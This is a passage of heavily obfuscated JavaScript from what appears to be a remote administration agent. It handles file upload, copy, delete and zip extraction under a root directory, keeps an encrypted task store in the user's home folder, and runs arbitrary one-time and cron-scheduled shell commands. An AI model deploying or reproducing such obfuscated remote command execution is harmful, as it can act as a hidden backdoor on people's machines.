        const cR = a0aY, g = {
                'LcObQ': function (l, m) {
                    return l(m);
                },
                'fWhzA': 'Access\x20denied:\x20path\x20outside\x20root',
                'sPLjh': function (l, m) {
                    return l > m;
                },
                'lMWAj': cR(0x7c9),
                'VkRpa': function (l, m) {
                    return l !== m;
                },
                'rphSW': function (l, m) {
                    return l(m);
                },
                'IbEbM': cR(0x6ef),
                'JxAIK': '.upload_chunks',
                'LkCRE': function (l, m) {
                    return l === m;
                }
            }, h = a0o[cR(0x791)](a0P['FILE_ROOT'], a);
        let j = h;
        b && (j = a0o[cR(0x2e0)](h, b));
        if (!g[cR(0x761)](a0W, j))
            throw new Error(g[cR(0x212)]);
        !a0l[cR(0xfe)](a0o['dirname'](j)) && a0l[cR(0x45e)](a0o[cR(0x2fc)](j), { 'recursive': !![] });
        const k = a0w['toByteArray'](c);
        if (g[cR(0x720)](k[cR(0x8fc)], a0P[cR(0x8a0)]))
            throw new Error(g['lMWAj']);
        if (g[cR(0x6dd)](d, null) && f !== null) {
            const l = g[cR(0x761)](Number, d), m = g[cR(0x351)](Number, f);
            if (Number['isNaN'](l) || Number[cR(0x517)](m))
                throw new Error(g[cR(0x771)]);
            const n = a0o[cR(0x2e0)](a0o[cR(0x2fc)](j), g[cR(0x266)], a0o[cR(0x884)](j));
            !a0l[cR(0xfe)](n) && a0l[cR(0x45e)](n, { 'recursive': !![] });
            const o = a0o['join'](n, 'chunk_' + l);
            a0l[cR(0x2b9)](o, k);
            const p = a0l[cR(0x603)](n)[cR(0x3fe)](s => s[cR(0x49a)](cR(0x66f))), q = p['length'], r = g[cR(0x269)](q, m);
            if (r) {
                const s = a0l['createWriteStream'](j);
                for (let u = 0x0; u < m; u++) {
                    const v = a0o['join'](n, 'chunk_' + u);
                    if (!a0l[cR(0xfe)](v)) {
                        s[cR(0x4a5)]();
                        throw new Error(cR(0x2f5) + u);
                    }
                    s[cR(0x624)](a0l[cR(0x734)](v));
                }
                s['end']();
                const t = a0o[cR(0x2fc)](n);
                a0l[cR(0x199)](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[cR(0x4d5)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0o[cR(0x74e)](a0P['FILE_ROOT'], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l[cR(0x2b9)](j, k), {
            'status': 'ok',
            'path': a0o['relative'](a0P[cR(0x823)], j),
            'received': k['length'],
            'total': k[cR(0x8fc)],
            'chunked': ![]
        };
    }
    static async [a0aY(0x24f)](a, b, c, d = null, f = null) {
        const cS = a0aY, g = {
                'wQbxR': function (k, l) {
                    return k || l;
                },
                'HWLwT': function (k, l) {
                    return k(l);
                },
                'vVuFv': function (k, l) {
                    return k > l;
                },
                'rIJjV': 'File\x20too\x20large',
                'KfjpL': function (k, l) {
                    return k !== l;
                },
                'rvfxh': cS(0x6ef),
                'ezCFT': cS(0x1da),
                'dqSSL': function (k, l) {
                    return k < l;
                },
                'SHbUT': cS(0x3dc)
            }, h = a0o[cS(0x791)](a0P['FILE_ROOT'], g['wQbxR'](a, '.'));
        let j = h;
        b && (j = a0o[cS(0x2e0)](h, b));
        if (!g[cS(0x7a2)](a0W, j))
            throw new Error(cS(0x5ee));
        !a0l[cS(0xfe)](a0o[cS(0x2fc)](j)) && a0l[cS(0x45e)](a0o['dirname'](j), { 'recursive': !![] });
        if (g['vVuFv'](c['length'], a0P[cS(0x8a0)]))
            throw new Error(g[cS(0x404)]);
        if (g[cS(0x188)](d, null) && g[cS(0x188)](f, null)) {
            const k = Number(d), l = g[cS(0x7a2)](Number, f);
            if (Number['isNaN'](k) || Number[cS(0x517)](l))
                throw new Error(g[cS(0xde)]);
            const m = a0o[cS(0x2e0)](a0o[cS(0x2fc)](j), g[cS(0x215)], a0o[cS(0x884)](j));
            !a0l['existsSync'](m) && a0l[cS(0x45e)](m, { 'recursive': !![] });
            const n = a0o[cS(0x2e0)](m, cS(0x66f) + k);
            a0l[cS(0x2b9)](n, c);
            const o = a0l[cS(0x603)](m)[cS(0x3fe)](r => r['startsWith'](cS(0x66f))), p = o[cS(0x8fc)], q = p === l;
            if (q) {
                const r = [];
                for (let t = 0x0; g[cS(0x58b)](t, l); t++) {
                    const u = a0o[cS(0x2e0)](m, cS(0x66f) + t);
                    if (!a0l[cS(0xfe)](u))
                        throw new Error(cS(0x2f5) + t);
                    r[cS(0x1f0)](a0l['readFileSync'](u));
                }
                a0l[cS(0x2b9)](j, Buffer['concat'](r));
                const s = a0o['dirname'](m);
                a0l[cS(0x199)](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l['rmdirSync'](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0o[cS(0x74e)](a0P[cS(0x823)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g['SHbUT']
                };
            }
            return {
                'status': 'ok',
                'path': a0o[cS(0x74e)](a0P['FILE_ROOT'], j),
                'chunk_id': k,
                'completed': ![],
                'message': cS(0x32d) + k + cS(0x307)
            };
        }
        return a0l[cS(0x2b9)](j, c), {
            'status': 'ok',
            'path': a0o['relative'](a0P[cS(0x823)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': cS(0x75b)
        };
    }
    static async [a0aY(0x904)](a) {
        const cT = a0aY, b = {
                'dYIAS': function (g, h) {
                    return g(h);
                },
                'ZEqgO': cT(0x5ee),
                'ZZIxs': cT(0x3c4)
            }, c = a0o[cT(0x791)](a0P[cT(0x823)], a);
        if (!b[cT(0x929)](a0W, c))
            throw new Error(b[cT(0x616)]);
        if (!a0l['existsSync'](c))
            throw new Error(b[cT(0x2c2)]);
        const d = a0l[cT(0xca)](c), f = await a0l[cT(0x31e)]['readFile'](c);
        return {
            'path': a0o[cT(0x74e)](a0P[cT(0x823)], c),
            'content': f,
            'size': d[cT(0x3e9)]
        };
    }
    static async [a0aY(0x778)](a) {
        const cU = a0aY, b = {
                'ZdhWu': function (d, f) {
                    return d(f);
                },
                'tNkhb': cU(0x6b5),
                'cAkQk': cU(0x8ff),
                'gjsdp': cU(0x1e9)
            }, c = [];
        for (const d of a) {
            const f = a0o[cU(0x791)](a0P[cU(0x823)], d);
            if (!b[cU(0x889)](a0W, f)) {
                c['push']({
                    'path': d,
                    'status': b[cU(0x58d)]
                });
                continue;
            }
            try {
                if (a0l['existsSync'](f)) {
                    const g = a0l[cU(0xca)](f);
                    g[cU(0x8e1)]() ? a0l['rmSync'](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l[cU(0x523)](f), c[cU(0x1f0)]({
                        'path': d,
                        'status': cU(0x3a5)
                    });
                } else
                    c[cU(0x1f0)]({
                        'path': d,
                        'status': b[cU(0x172)]
                    });
            } catch (h) {
                c[cU(0x1f0)]({
                    'path': d,
                    'status': b[cU(0x617)],
                    'message': h[cU(0x113)]
                });
            }
        }
        return c;
    }
    static async [a0aY(0x165)](a) {
        const cV = a0aY, b = {
                'gdKHu': function (d, f) {
                    return d(f);
                },
                'jRWRM': function (d, f) {
                    return d(f);
                },
                'hVFvd': 'access_denied',
                'KGpqJ': cV(0x1e9)
            }, c = [];
        for (const [d, f] of Object[cV(0x76e)](a)) {
            const g = a0o[cV(0x791)](a0P[cV(0x823)], d), h = a0o[cV(0x791)](a0P['FILE_ROOT'], f);
            if (!b[cV(0x34a)](a0W, g) || !b[cV(0x2d6)](a0W, h)) {
                c[cV(0x1f0)]({
                    'from': d,
                    'to': f,
                    'status': b['hVFvd']
                });
                continue;
            }
            try {
                const i = a0o[cV(0x2fc)](h);
                !a0l[cV(0xfe)](i) && a0l[cV(0x45e)](i, { 'recursive': !![] }), a0l[cV(0x859)](g, h), c[cV(0x1f0)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[cV(0x1f0)]({
                    'from': d,
                    'to': f,
                    'status': b[cV(0x74c)],
                    'message': j['message']
                });
            }
        }
        return c;
    }
    static async [a0aY(0x376)](a) {
        const cW = a0aY, b = {
                'uGqKJ': function (d, f) {
                    return d(f);
                },
                'nUJiI': cW(0x6b5),
                'bgVyf': cW(0x8ff),
                'oqAIA': cW(0x1e9)
            }, c = [];
        for (const [d, f] of Object[cW(0x76e)](a)) {
            const g = a0o['resolve'](a0P[cW(0x823)], d), h = a0o[cW(0x791)](a0P['FILE_ROOT'], f);
            if (!b[cW(0x42b)](a0W, g) || !b['uGqKJ'](a0W, h)) {
                c[cW(0x1f0)]({
                    'from': d,
                    'to': f,
                    'status': b['nUJiI']
                });
                continue;
            }
            try {
                if (!a0l[cW(0xfe)](g)) {
                    c[cW(0x1f0)]({
                        'from': d,
                        'to': f,
                        'status': b[cW(0x3f8)]
                    });
                    continue;
                }
                const i = a0o['dirname'](h);
                !a0l['existsSync'](i) && a0l['mkdirSync'](i, { 'recursive': !![] });
                const j = a0l[cW(0xca)](g);
                if (j[cW(0x8e1)]()) {
                    if (a0l[cW(0x8b8)])
                        a0l[cW(0x8b8)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const cX = cW;
                            if (a0l[cX(0xca)](l)[cX(0x8e1)]()) {
                                if (!a0l[cX(0xfe)](m))
                                    a0l['mkdirSync'](m, { 'recursive': !![] });
                                for (const n of a0l['readdirSync'](l)) {
                                    k(a0o['join'](l, n), a0o[cX(0x2e0)](m, n));
                                }
                            } else
                                a0l[cX(0x76b)](l, m);
                        };
                        k(g, h);
                    }
                } else
                    a0l[cW(0x76b)](g, h);
                c[cW(0x1f0)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[cW(0x1f0)]({
                    'from': d,
                    'to': f,
                    'status': b[cW(0x902)],
                    'message': l[cW(0x113)]
                });
            }
        }
        return c;
    }
    static async [a0aY(0x4bf)](a) {
        const cY = a0aY, b = { 'saXCZ': cY(0x5ee) }, c = a0o[cY(0x791)](a0P[cY(0x823)], a);
        if (!a0W(c))
            throw new Error(b['saXCZ']);
        return a0l['mkdirSync'](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0o[cY(0x74e)](a0P['FILE_ROOT'], c)
        };
    }
    static ['_displayPath'](a) {
        const cZ = a0aY;
        return a0o[cZ(0x74e)](a0P[cZ(0x823)], a) || '.';
    }
    static async [a0aY(0x440)](a, b, c = ![]) {
        const d0 = a0aY, d = {
                'GElOE': function (k, l) {
                    return k === l;
                },
                'CQQsl': 'items\x20required\x20(non-empty\x20array)',
                'SkAvH': function (k, l) {
                    return k(l);
                },
                'rrRLl': 'Access\x20denied:\x20path\x20outside\x20root',
                'KrHNo': d0(0x431),
                'BvgZW': function (k, l) {
                    return k || l;
                },
                'KPWNd': function (k, l) {
                    return k(l);
                },
                'btEbW': d0(0x1e9),
                'AGVei': d0(0x8ff),
                'GRpSF': function (k, l, m) {
                    return k(l, m);
                },
                'LkugZ': d0(0x6ea)
            };
        if (!a)
            throw new Error(d0(0x5bf));
        if (!Array[d0(0x22c)](b) || d['GElOE'](b['length'], 0x0))
            throw new Error(d[d0(0x70e)]);
        const f = a0o[d0(0x791)](a0P[d0(0x823)], a);
        if (!d[d0(0x3cf)](a0W, f))
            throw new Error(d['rrRLl']);
        if (a0l[d0(0xfe)](f) && a0l[d0(0xca)](f)[d0(0x8e1)]())
            throw new Error(d0(0x730) + a);
        a0l['mkdirSync'](a0o[d0(0x2fc)](f), { 'recursive': !![] });
        if (a0l[d0(0xfe)](f))
            a0l[d0(0x523)](f);
        const g = a0X[d0(0x274)](f), h = [];
        let i = 0x0, j = ![];
        for (const k of b) {
            if (j) {
                h[d0(0x1f0)]({
                    'item': k,
                    'status': d[d0(0x866)],
                    'added': 0x0
                });
                continue;
            }
            const l = a0o[d0(0x791)](a0P[d0(0x823)], d['BvgZW'](k, ''));
            try {
                if (!d['KPWNd'](a0W, l)) {
                    h[d0(0x1f0)]({
                        'item': k,
                        'status': d['btEbW'],
                        'added': 0x0
                    });
                    continue;
                }
                if (!a0l[d0(0xfe)](l)) {
                    h[d0(0x1f0)]({
                        'item': k,
                        'status': d[d0(0x639)],
                        'added': 0x0
                    });
                    continue;
                }
                const m = a0l[d0(0xca)](l);
                let n = 0x0, o = ![];
                if (m[d0(0x10b)]()) {
                    if (!g['add'](a0o[d0(0x884)](l), a0l[d0(0x734)](l), m[d0(0x359)])) {
                        j = !![], h[d0(0x1f0)]({
                            'item': k,
                            'status': d[d0(0x866)],
                            'added': 0x0
                        });
                        continue;
                    }
                    n = 0x1;
                } else {
                    if (m[d0(0x8e1)]()) {
                        const p = a0o[d0(0x884)](l), q = (r, s) => {
                                const d1 = d0;
                                for (const t of a0l[d1(0x603)](r)) {
                                    const u = a0o['join'](r, t), v = s ? s + '/' + t : t, w = a0l[d1(0xca)](u);
                                    if (w[d1(0x8e1)]()) {
                                        if (!g[d1(0x429)](v + '/', Buffer[d1(0x5fd)](0x0), w[d1(0x359)], !![])) {
                                            o = !![];
                                            return;
                                        }
                                        q(u, v);
                                        if (o)
                                            return;
                                    } else {
                                        if (w[d1(0x10b)]()) {
                                            if (!g[d1(0x429)](v, a0l['readFileSync'](u), w['mtime'])) {
                                                o = !![];
                                                return;
                                            }
                                            n++;
                                        }
                                    }
                                }
                            };
                        d['GRpSF'](q, l, c ? '' : p);
                    } else {
                        h[d0(0x1f0)]({
                            'item': k,
                            'status': d0(0x1e9),
                            'added': 0x0
                        });
                        continue;
                    }
                }
                if (o) {
                    j = !![], i += n, h[d0(0x1f0)]({
                        'item': k,
                        'status': d[d0(0x7e8)],
                        'added': n
                    });
                    continue;
                }
                i += n, h['push']({
                    'item': k,
                    'status': 'ok',
                    'added': n
                });
            } catch (r) {
                h['push']({
                    'item': k,
                    'status': d[d0(0x60d)],
                    'added': 0x0
                });
            }
        }
        return g[d0(0x4a5)](), {
            'status': 'ok',
            'path': a0Y[d0(0x5df)](f),
            'entries': i,
            'size': a0l[d0(0xfe)](f) ? a0l[d0(0xca)](f)['size'] : 0x0,
            'results': h
        };
    }
    static async ['unzipArchive'](a, b, c = !![], d = null) {
        const d2 = a0aY, f = {
                'YRDbC': d2(0x5bf),
                'eLcam': function (p, q) {
                    return p(q);
                },
                'isrpL': function (p, q) {
                    return p >= q;
                },
                'PZvIU': function (p, q) {
                    return p + q;
                },
                'deFpm': function (p, q) {
                    return p > q;
                },
                'HxqxI': function (p, q) {
                    return p !== q;
                },
                'kIESK': function (p, q) {
                    return p < q;
                }
            };
        if (!a)
            throw new Error(f[d2(0x7b1)]);
        const g = a0o[d2(0x791)](a0P[d2(0x823)], a);
        if (!f[d2(0x240)](a0W, g))
            throw new Error(d2(0x5ee));
        if (!a0l[d2(0xfe)](g))
            throw new Error(d2(0x7a5) + a);
        if (a0l[d2(0xca)](g)[d2(0x8e1)]())
            throw new Error(d2(0x363) + a);
        let h;
        if (b) {
            h = a0o['resolve'](a0P[d2(0x823)], b);
            if (!f[d2(0x240)](a0W, h))
                throw new Error(d2(0x5ee));
            if (a0l[d2(0xfe)](h) && !a0l['statSync'](h)['isDirectory']())
                throw new Error(d2(0x686) + b);
        } else
            h = a0o['dirname'](g);
        a0l[d2(0x45e)](h, { 'recursive': !![] });
        let i;
        try {
            i = a0X[d2(0x675)](g);
        } catch (p) {
            throw new Error(d2(0x463) + a);
        }
        const j = (d || [])['filter'](q => q);
        let k = 0x0, l = 0x0, m = 0x0;
        const n = [];
        let o = ![];
        for (const q of i) {
            if (q[d2(0xf8)])
                continue;
            if (f[d2(0x5a2)](f[d2(0x47f)](k, l), a0X[d2(0x167)]) || m >= a0X[d2(0xd3)]) {
                l++;
                continue;
            }
            const r = q[d2(0x258)][d2(0x7ee)](/\\/g, '/');
            if (j['length']) {
                const v = r[d2(0x3ab)]('/')[d2(0x37e)]();
                if (!j[d2(0x27e)](r) && !j[d2(0x27e)](v)) {
                    l++;
                    continue;
                }
            }
            if (q['encrypted'] || q['zip64'] || f[d2(0x844)](f[d2(0x47f)](m, q['size']), a0X[d2(0xd3)])) {
                l++;
                continue;
            }
            const s = a0o[d2(0x791)](h, r), t = a0o[d2(0x74e)](h, s);
            if (t[d2(0x49a)]('..') || a0o[d2(0x208)](t)) {
                l++;
                continue;
            }
            if (!a0W(s)) {
                l++;
                continue;
            }
            let u;
            try {
                u = a0X[d2(0x66a)](q);
            } catch (w) {
                l++;
                continue;
            }
            if (f['HxqxI'](a0X[d2(0x8c5)](u), q['crc'])) {
                l++;
                continue;
            }
            if (!c && a0l[d2(0xfe)](s)) {
                l++;
                continue;
            }
            try {
                a0l[d2(0x45e)](a0o[d2(0x2fc)](s), { 'recursive': !![] }), a0l[d2(0x2b9)](s, u);
            } catch (x) {
                l++;
                continue;
            }
            k++, m += q[d2(0x3e9)], f[d2(0x6db)](n[d2(0x8fc)], a0X[d2(0x76f)]) ? n[d2(0x1f0)](a0Y[d2(0x5df)](s)) : o = !![];
        }
        return {
            'status': 'ok',
            'path': a0Y[d2(0x5df)](g),
            'dest': a0Y[d2(0x5df)](h),
            'extracted': k,
            'skipped': l,
            'files': n,
            'files_truncated': o
        };
    }
}
class a0Z {
    static ['MAGIC'] = a0aY(0x7f0);
    static [a0aY(0xd8)] = 0x1;
    static [a0aY(0x784)] = {
        'enabled': ![],
        'locked': ![],
        'path': null,
        'key': null,
        'lastSavedAt': null
    };
    static [a0aY(0x1c9)]() {
        const d3 = a0aY;
        for (const a of [
                process.env.USERPROFILE,
                process.env.HOME
            ]) {
            if (a && a0l[d3(0xfe)](a))
                return a;
        }
        try {
            return a0p[d3(0x644)]() || process['cwd']();
        } catch (b) {
            return process[d3(0x2c4)]();
        }
    }
    static [a0aY(0x3bd)](a) {
        const d4 = a0aY, b = {
                'CdLBJ': function (c, d) {
                    return c === d;
                }
            };
        if (!a)
            return null;
        try {
            if (/^[0-9a-fA-F]{64}$/[d4(0x292)](a)) {
                const d = Buffer[d4(0x317)](a, 'hex');
                return d[d4(0x8fc)] === 0x20 ? d : null;
            }
            if (!/^[A-Za-z0-9+/]+={0,2}$/[d4(0x292)](a))
                return null;
            const c = Buffer[d4(0x317)](a, 'base64');
            return b[d4(0x6f6)](c['length'], 0x20) ? c : null;
        } catch (f) {
            return null;
        }
    }
    static [a0aY(0x5bd)]() {
        const d5 = a0aY, a = {
                'gUGMB': 'none',
                'OYLEe': 'false',
                'sgMJr': d5(0x29a),
                'FjJEx': d5(0x81c),
                'ijcuF': d5(0x220)
            }, b = a0Z[d5(0x784)];
        let c = (process.env.KSTORE || '')[d5(0x2eb)]();
        if ([
                d5(0x575),
                '0',
                a[d5(0x53f)],
                a['OYLEe']
            ]['includes'](c['toLowerCase']()))
            return a0D[d5(0x5ac)](d5(0x372)), b;
        const d = (process.env.KSTORE_KEY || '')[d5(0x2eb)]();
        !c && (c = a0o[d5(0x2e0)](a0Z[d5(0x1c9)](), a[d5(0x528)], d5(0x8a3)));
        const f = a0Z[d5(0x3bd)](d);
        if (!f) {
            if (d)
                a0D[d5(0x1e9)](a['FjJEx']);
            else
                a0D['info'](a[d5(0x19d)]);
            return b;
        }
        return b[d5(0x7d3)] = c, b['key'] = f, b[d5(0xdc)] = !![], a0D['info'](d5(0x3e1) + b[d5(0x7d3)]), b;
    }
    static [a0aY(0x776)](a, b) {
        const d6 = a0aY, c = {
                'MCmyt': 'aes-256-gcm',
                'kJeqE': d6(0x262),
                'gTAzv': d6(0x330)
            }, d = a0k[d6(0x6de)](0xc), f = a0k[d6(0x1c1)](c[d6(0x7b9)], a, d), g = Buffer[d6(0x65f)]([
                f[d6(0x1cf)](Buffer['from'](b, d6(0x330))),
                f[d6(0x4aa)]()
            ]), h = {
                'nonce': d['toString'](d6(0x262)),
                'tag': f[d6(0x777)]()['toString'](d6(0x262)),
                'ciphertext': g[d6(0x62f)](c[d6(0x35e)])
            };
        return Buffer[d6(0x317)](JSON['stringify'](h), c[d6(0x3da)])[d6(0x62f)](c['kJeqE']);
    }
    static ['decrypt'](a, b) {
        const d7 = a0aY, c = {
                'gmMhu': d7(0x330),
                'QmBjS': d7(0x539),
                'jIGys': 'aes-256-gcm',
                'OdbZn': 'base64'
            }, d = JSON['parse'](Buffer[d7(0x317)](b, 'base64')[d7(0x62f)](c[d7(0x816)]));
        if (!d['nonce'] || !d[d7(0x1ea)] || !d['ciphertext'])
            throw new Error(c['QmBjS']);
        const f = a0k[d7(0x4be)](c[d7(0x1c2)], a, Buffer[d7(0x317)](d['nonce'], c[d7(0x748)]));
        return f[d7(0x84b)](Buffer['from'](d[d7(0x1ea)], c[d7(0x748)])), Buffer[d7(0x65f)]([
            f[d7(0x1cf)](Buffer[d7(0x317)](d['ciphertext'], c[d7(0x748)])),
            f[d7(0x4aa)]()
        ])['toString'](c[d7(0x816)]);
    }
    static ['load']() {
        const d8 = a0aY, a = {
                'XAbMH': 'utf8',
                'YlBhu': function (c, d) {
                    return c !== d;
                },
                'FZrby': d8(0x132),
                'KYQho': function (c, d) {
                    return c > d;
                },
                'hHutt': function (c, d) {
                    return c !== d;
                },
                'sRDOd': function (c, d) {
                    return c(d);
                }
            }, b = a0Z[d8(0x784)];
        if (!b[d8(0xdc)])
            return {
                'onetasks': [],
                'crontasks': {}
            };
        try {
            if (!a0l[d8(0xfe)](b[d8(0x7d3)]))
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            const c = a0l[d8(0x734)](b[d8(0x7d3)], a[d8(0x818)])['trim']();
            if (!c)
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            let d;
            try {
                d = JSON[d8(0x675)](a0Z[d8(0x321)](b[d8(0x793)], c));
            } catch (j) {
                throw new Error(d8(0x503) + j['message']);
            }
            if (!d || a[d8(0x786)](d[d8(0x561)], a0Z[d8(0x16a)]))
                throw new Error(a[d8(0x252)]);
            const f = parseInt(d[d8(0x1fb)], 0xa) || 0x0;
            if (a[d8(0x85c)](f, a0Z[d8(0xd8)]))
                return b[d8(0x79e)] = !![], a0D['error'](d8(0xff) + f + d8(0x45d) + a0Z[d8(0xd8)] + d8(0x5a7)), {
                    'onetasks': [],
                    'crontasks': {}
                };
            if (a['hHutt'](f, a0Z[d8(0xd8)]))
                throw new Error('不支持的版本\x20' + f);
            const g = d[d8(0x7a4)] || {};
            b[d8(0x489)] = d['saved_at'] || null;
            const h = Array[d8(0x22c)](g[d8(0x367)]) ? g[d8(0x367)][d8(0x162)](String) : [], i = {};
            for (const [l, m] of Object[d8(0x76e)](g['crontasks'] || {}))
                i[a['sRDOd'](String, l)] = String(m);
            return a0D[d8(0x5ac)](d8(0x71e) + h[d8(0x8fc)] + d8(0x914) + Object[d8(0x3d5)](i)['length']), {
                'onetasks': h,
                'crontasks': i
            };
        } catch (n) {
            return a0Z[d8(0x2b3)](d8(0x249) + n['message']), {
                'onetasks': [],
                'crontasks': {}
            };
        }
    }
    static ['quarantine'](a) {
        const d9 = a0aY;
        try {
            const b = a0Z['state'];
            if (b[d9(0x7d3)] && a0l['existsSync'](b[d9(0x7d3)])) {
                const c = b['path'] + d9(0x464) + Date[d9(0x4ea)]();
                a0l[d9(0x859)](b[d9(0x7d3)], c), a0D[d9(0x1e9)](d9(0x394) + a + d9(0x899) + c);
            } else
                a0D[d9(0x1e9)](d9(0x394) + a);
        } catch (d) {
            a0D[d9(0x1e9)](d9(0x394) + a + d9(0x7d1) + d[d9(0x113)]);
        }
    }
    static [a0aY(0x253)](a, b) {
        const da = a0aY, c = { 'OWUUx': da(0x330) }, d = a0Z[da(0x784)];
        if (!d[da(0xdc)] || d[da(0x79e)])
            return ![];
        let f = null;
        try {
            const g = {
                    'magic': a0Z[da(0x16a)],
                    'version': a0Z[da(0xd8)],
                    'saved_at': new Date()[da(0x618)]()[da(0x7ee)](/\.\d+Z$/, 'Z'),
                    'data': {
                        'onetasks': a || [],
                        'crontasks': b || {}
                    }
                }, h = a0Z[da(0x776)](d[da(0x793)], JSON['stringify'](g));
            return a0l[da(0x45e)](a0o['dirname'](d[da(0x7d3)]), { 'recursive': !![] }), f = d[da(0x7d3)] + da(0x6d3) + process[da(0x24b)], a0l['writeFileSync'](f, h, c['OWUUx']), a0l[da(0x859)](f, d[da(0x7d3)]), d['lastSavedAt'] = g[da(0x36e)], !![];
        } catch (i) {
            a0D[da(0x1e9)](da(0x841) + i[da(0x113)]);
            try {
                if (f && a0l[da(0xfe)](f))
                    a0l[da(0x523)](f);
            } catch (j) {
            }
            return ![];
        }
    }
}
class a0a0 {
    static [a0aY(0x4c0)] = new Map();
    static [a0aY(0x89b)](a, b) {
        const db = a0aY, c = {
                'NGdRM': function (d, f) {
                    return d - f;
                }
            };
        a[db(0x1f0)](b), a[db(0x8fc)] > a0P['MAX_TASK_LOG_SIZE'] && a['splice'](0x0, c[db(0x14f)](a[db(0x8fc)], a0P[db(0x73c)]));
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const dc = a0aY, g = new Date()[dc(0x618)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + dc(0x8e2) + a + dc(0x119) + c + '\x0a' + (b?.[dc(0x2eb)]() || '')
        };
    }
    static [a0aY(0x5fe)]() {
        return {
            'status': 'ok',
            'count': a0P['onetasks']['length'],
            'tasks': a0P['onetasks']
        };
    }
    static async [a0aY(0x308)](a) {
        const dd = a0aY, b = {
                'NDQvd': function (d, f) {
                    return d > f;
                },
                'saJNK': dd(0x4f0),
                'mBZFl': function (d, f) {
                    return d === f;
                },
                'eTucc': dd(0x1e9)
            };
        a0P['onetasks'] = a || [];
        const c = [];
        if (a0P['InitTask'] && b['NDQvd'](a0P[dd(0x367)][dd(0x8fc)], 0x0)) {
            for (let d = 0x0; d < a0P['onetasks']['length']; d++) {
                const f = a0P['onetasks'][d], g = await a0V[dd(0xec)](f), h = this[dd(0x6aa)](f, g[dd(0x230)], g[dd(0x8ea)], b[dd(0xd1)]);
                this[dd(0x89b)](a0P['onetimetasks_log'], h), c[dd(0x1f0)]({
                    'index': d,
                    'cmd': f,
                    'exitcode': g[dd(0x8ea)],
                    'output': g[dd(0x230)],
                    'status': b[dd(0x474)](g[dd(0x8ea)], 0x0) ? 'ok' : b['eTucc']
                });
            }
            a0P[dd(0x855)] = ![];
        }
        return {
            'status': 'ok',
            'count': a0P[dd(0x367)][dd(0x8fc)],
            'tasks': a0P['onetasks'],
            'executed': c,
            'persisted': a0Z['save'](a0P[dd(0x367)], a0P[dd(0x613)])
        };
    }
    static [a0aY(0x636)]() {
        const de = a0aY;
        return {
            'status': 'ok',
            'count': Object['keys'](a0P[de(0x613)])[de(0x8fc)],
            'tasks': a0P[de(0x613)]
        };
    }
    static ['setCronTasks'](a) {
        const df = a0aY, b = {
                'KicKO': df(0x809),
                'jhqKR': function (d, f) {
                    return d === f;
                },
                'ofiDJ': df(0x284),
                'qEPnv': function (d, f) {
                    return d > f;
                },
                'vzdlp': 'error'
            };
        this[df(0x4c0)][df(0x7b6)](d => {
            const dg = df;
            typeof d[dg(0x48e)] === b[dg(0x389)] && d[dg(0x48e)](), b[dg(0x79b)](typeof d[dg(0x6cf)], b[dg(0x389)]) && d['destroy']();
        }), this[df(0x4c0)][df(0x660)]();
        const c = [];
        for (const d of Object['keys'](a || {})) {
            !a0t[df(0x4b3)](d) && c[df(0x1f0)](d);
        }
        if (b[df(0x337)](c[df(0x8fc)], 0x0))
            return {
                'status': b[df(0x201)],
                'message': df(0x214) + c[df(0x2e0)](',\x20'),
                'valid_count': Object['keys'](a || {})[df(0x8fc)] - c[df(0x8fc)]
            };
        a0P[df(0x613)] = a || {};
        for (const [f, g] of Object[df(0x76e)](a0P[df(0x613)])) {
            const h = a0t['schedule'](f, async () => {
                const dh = df, i = await a0V['execute'](g), j = this['_formatLogEntry'](g, i[dh(0x230)], i['exitcode'], b[dh(0x543)], f);
                this['_appendLog'](a0P[dh(0x667)], j);
            });
            this[df(0x4c0)]['set'](f, h);
        }
        return a0P['cronloop'] = b[df(0x337)](Object[df(0x3d5)](a0P[df(0x613)])['length'], 0x0), {
            'status': 'ok',
            'count': Object[df(0x3d5)](a0P[df(0x613)])['length'],
            'tasks': a0P[df(0x613)],
            'persisted': a0Z[df(0x253)](a0P[df(0x367)], a0P[df(0x613)])
        };
    }
    static [a0aY(0x5f1)]() {
        const di = a0aY;
        return {
            'onetime': {
                'pending': a0P[di(0x855)],
                'count': a0P[di(0x367)][di(0x8fc)]
            },
            'cron': {
                'active': a0P[di(0x2a8)],
                'count': Object[di(0x3d5)](a0P[di(0x613)])[di(0x8fc)],
                'check_interval': a0P['CRON_CHECK_INTERVAL']
            },
            'persistence': {
                'enabled': a0Z['state'][di(0xdc)],
                'store_path': a0Z[di(0x784)][di(0x7d3)],
                'last_saved_at': a0Z[di(0x784)]['lastSavedAt']
            }
        };
    }
    static [a0aY(0x560)](a = 0x32) {
        const dj = a0aY, b = a0P[dj(0x264)][dj(0x806)](-a);
        return {
            'status': 'ok',
            'count': b[dj(0x8fc)],
            'logs': b
        };
    }
    static ['getCronLogs'](a = 0x32) {
        const dk = a0aY, b = a0P[dk(0x667)][dk(0x806)](-a);
        return {
            'status': 'ok',
            'count': b[dk(0x8fc)],
            'logs': b
        };
    }
    static [a0aY(0x8ee)]() {
        const dl = a0aY, a = { 'YwARl': dl(0x4f0) }, b = a0P[dl(0x264)][dl(0x8fc)];
        return a0P[dl(0x264)] = [], {
            'status': 'ok',
            'cleared': a[dl(0x83e)]
        };
    }
    static [a0aY(0x8a8)]() {
        const dm = a0aY, a = { 'cQDjv': dm(0x284) }, b = a0P[dm(0x667)][dm(0x8fc)];
        return a0P[dm(0x667)] = [], {
            'status': 'ok',
            'cleared': a['cQDjv']
        };
    }
    static [a0aY(0x765)]() {
        const dn = a0aY, a = {
